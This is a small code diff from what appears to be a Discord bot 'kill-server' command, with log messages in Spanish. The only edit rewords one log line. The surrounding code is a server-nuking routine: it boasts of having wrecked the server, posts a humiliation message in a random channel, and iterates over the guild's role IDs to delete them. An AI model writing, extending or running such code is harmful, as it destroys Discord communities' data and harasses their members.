@@ -3,7 +3,7 @@ name: "kill-server",
 code: `
 $log[✅  He terminado de joder el servidor "$serverName"]
 $channelSendMessage[$randomChannelID;✅ He terminado de joder el servidor :)]
-$log[🕖  Mandando un mensaje de humillación si algún canal sigue vivo...]
+$log[🕖  Mandando un mensaje de humillación en un canal aleatorio...]
 $textSplitMap[del-roles]
 $textSplit[$guildRoles[id];, ]
 $wait[1]
